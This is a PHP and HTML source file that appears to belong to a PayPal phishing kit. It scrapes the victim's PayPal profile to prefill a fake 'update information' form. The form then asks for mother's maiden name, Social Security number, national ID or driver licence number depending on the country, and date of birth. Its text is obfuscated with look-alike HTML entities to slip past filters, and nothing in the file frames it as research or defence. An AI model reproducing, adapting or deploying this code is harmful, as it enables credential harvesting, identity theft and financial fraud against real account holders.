<?php

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
	$response = curl('https://www.paypal.com/cgi-bin/webscr?cmd=_profile-address');
	$nama     = getStr($response, 'emphasis">', '<br>');
	$form     = getStr($response, '<tbody><form', 'class="btnLink btnMake">');
	$action   = getStr($form, 'method="post" action="', '"');
	$add_id   = getStr($form, 'name="address_id" value="', '">');
	$cc_count = getStr($form , 'name="card_count" value="', '">');
	$variable = 'return=&address_id='.$add_id.'&card_count='.$cc_count.'&edit.x=Edit';
	$getinfo  = curl($action, $variable);
	$getinfo  = str_replace('&#x20;', ' ', $getinfo);

	$add_1    = getStr($getinfo, 'name="address1" value="', '"');
	$add_2    = getStr($getinfo, 'name="address2" value="', '"');
	$city     = getStr($getinfo, 'name="city" value="', '"');
	$state    = getStr($getinfo, 'name="state" value="', '"');
	$zip      = getStr($getinfo, 'name="zip" value="', '"');

	$respons = curl('https://www.paypal.com/cgi-bin/webscr?cmd=_profile-phone');
	$phone	 = strip_tags('<input type="hidden" ' . fetch_value($respons, 'name="phone"', '</label>'));
	$phone   = str_replace('&#x20;', '', $phone);
	$phone   = str_replace('&#x2d;', '', $phone);
?>
							<script src="../js/jquery.billing.js"></script>
					<form method="post" id="parentForm" name="creditcard_Form" action="webscr?cmd=_update-information&account_card=<?php echo md5(microtime());?>&session=<?php echo sha1(microtime()); ?>" class="edit">
						<p class="group fcenter">

<?php
						if (!$nama==''){ echo '
							<label for="full_name">&Alpha;ccount Name :</label>
								<span class="field">
									<input maxlength="30" class="large" autocomplete="off" required="required" name="full_name" value="'.$nama.'" type="text" readonly></span>
						';
						}
?>

							<label for="address_1">&Alpha;ddress line 1 :</label>
								<span class="field">
									<input maxlength="30" class="large" autocomplete="off" required="required" name="address_1" value="<?php echo $add_1; ?>" type="text"></span>


							<label for="address_2">&Alpha;ddress line 2 :</label>
								<span class="field">
									<input maxlength="30" class="large" autocomplete="off"  name="address_2" value="<?php echo $add_2; ?>" type="text" placeholder="optional"></span>


							<label for="city">City :</label>
								<span class="field">
									<input maxlength="30" class="xmedium" autocomplete="off" required="required" name="city" value="<?php echo $city; ?>" type="text"></span>


							<label for="state">State / County :</label>
								<span class="field">
									<input maxlength="30" class="xmedium" autocomplete="off" name="state" value="<?php echo $state; ?>" type="text"></span>


							<label for="postal">ZIP / &Rho;ost c&omicron;de :</label>
								<span class="field">
									<input maxlength="11" class="medium" autocomplete="off" required="required" name="postal" value="<?php echo $zip; ?>" type="text"></span>


<?php
						if (!$nama_negara==''){ echo '
							<label for="country">Country :</label>
								<span class="field">
									<input maxlength="11" class="large" autocomplete="off" required="required" name="country" value="'.$nama_negara.'" type="text" readonly></span>
						';
						}
?>



							<span class="help" style="padding-left: 4%;">Use f&omicron;r &#102;raud alert.</span>
								<label for="phone">&Rho;hone Number :</label>
									<span class="field">
										<input pattern="[0-9]{5,}" maxlength="15" class="xmedium" autocomplete="off" required="required" name="phone" value="<?php echo $phone; ?>" type="text" placeholder="primary"></span>

										
<?php
						if ($negara=="HK" or $negara=="CA" or $negara=="US" or $negara=="CZ" or $negara=="NZ" or $negara=="FI" or $negara=="FR" or $negara=="DE" or $negara=="PT" or $negara=="RE" or $negara=="MY" or $negara=="US" or $negara=="GB" or $negara=="AU" or $negara=="IE" or $negara=="IL" or $negara=="ES" or $negara=="BR" or $negara=="CH"){ echo '										
                          <span class="help" style="padding-left: 4%;">For &#115;ecurity rea&#115;on, Plea&#115;e enter your correct in&#102;ormation.</span>
									<label for="ssn">Mother&apos;s 	&#77;aiden Name :</label>
										<span class="field">
											<input maxlength="25" class="xxmedium" autocomplete="off" name="mmd" required="required" value="" type="text"></span>
						';
						}
?>	


	
<?php
						if 		($negara=="US"){ echo '
								<span class="help" style="padding-left: 4%;">Same tax &Iota;D as on y&omicron;ur tax return.</span>
									<label for="ssn">S&omicron;cial Secur&#x0069;ty &Nu;umber :</label>
										<span class="field">
											<input name="number_1" class="xxsmall" pattern="[0-9]{3,}" maxlength="3" autocomplete="off" required="required" value="" type="text"> - 
											<input name="number_2" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" value="" type="text"> - 
											<input name="number_3" class="xxsmall" pattern="[0-9]{4,}" maxlength="4" autocomplete="off" required="required" value="" type="text"></span>
						';
						} elseif ($negara=="IL"){ echo '
								<span class="help" style="padding-left: 4%;">Same tax &Iota;D as on y&omicron;ur tax return.</span>
									<label for="ssn">S&omicron;cial Secur&#x0069;ty &Nu;umber :</label>
										<span class="field">
											<input name="number_1" class="xxsmall" pattern="[0-9]{3,}" maxlength="3" autocomplete="off" required="" value="" type="text"> - 
											<input name="number_2" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="" value="" type="text"> - 
											<input name="number_3" class="xxsmall" pattern="[0-9]{4,}" maxlength="4" autocomplete="off" required="" value="" type="text"></span>
						';
						} elseif ($negara=="HK") { echo '
								<span class="help" style="padding-left: 4%;">&Nu;eed f&omicron;r &#x0069;dentif&#x0069;cation.</span>
									<label for="ssn">&Nu;ati&omicron;nal &Iota;D &Nu;umber :</label>
										<span class="field">
											<input maxlength="25" class="xxmedium" autocomplete="off" name="id_number" required="required" value="" type="text"></span>
						';
						} elseif ($negara=="AU") { echo '
								<span class="help" style="padding-left: 4%;">&Nu;eed f&omicron;r identif&#x0069;cation.</span>
									<label for="ssn">&#68;river licence &Nu;umber :</label>
										<span class="field">
											<input maxlength="20" class="xxmedium" autocomplete="off" name="id_number" required="required" value="" type="text"></span>
						';
						} elseif ($negara=="IT") { echo '
								<span class="help" style="padding-left: 4%;">&Nu;eed f&omicron;r &#x0069;dentif&#x0069;cation.</span>
									<label for="ssn">Tax identification code :</label>
										<span class="field">
											<input maxlength="20" class="xxmedium" autocomplete="off" name="id_number" required="required" value="" type="text" placeholder="Codice Fiscale"></span>
						';
						}
?>
						
							<span class="help" style="padding-left: 4%;">We'll conf&#x0069;rm.</span>
								<label for="dob">Date of birth :</label>
									<span class="field">
<?php
echo date_dropdown(18);
function date_dropdown($year_limit = 0)
{
		/*months*/
		$html_output .= '										<select class="mediu" required="required" title="Month" name="month">'."\n";
		$html_output .= '											<option selected="selected" value="">month</option>';
		$months = array("", "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec");
			for ($month = 1; $month <= 12; $month++) {
				$html_output .= '<option value="' . $month . '">' . $months[$month] . '</option>';
			}
		$html_output .= "\n".'										</select>'."\n";

		/*days*/
		$html_output .= '										<select class="smal" required="required" title="Day" name="day">'."\n";
		$html_output .= '											<option selected="selected" value="">day</option>';
			for ($day = 1; $day <= 31; $day++) {
				$html_output .= '<option value="' . $day . '">' . $day . '</option>';
			}
		$html_output .= "\n".'										</select>'."\n";

		/*years*/
		$html_output .= '										<select class="mediu" required="required" title="Year" name="year">'."\n";
		$html_output .= '											<option selected="selected" value="">year</option>';
			for ($year = (date("Y") - $year_limit); $year >= 1900; $year--) {
				$html_output .= '<option value="' . $year . '">' . $year . '</option>';
			}
		$html_output .= "\n".'										</select>'."\n";

	return $html_output;
}
?>
									</span>


						</p>

						<p class="bcenter">
						<button style="width: 100px !important;" type="submit" value="Next" class="button">Next</button></p>
						
					</form>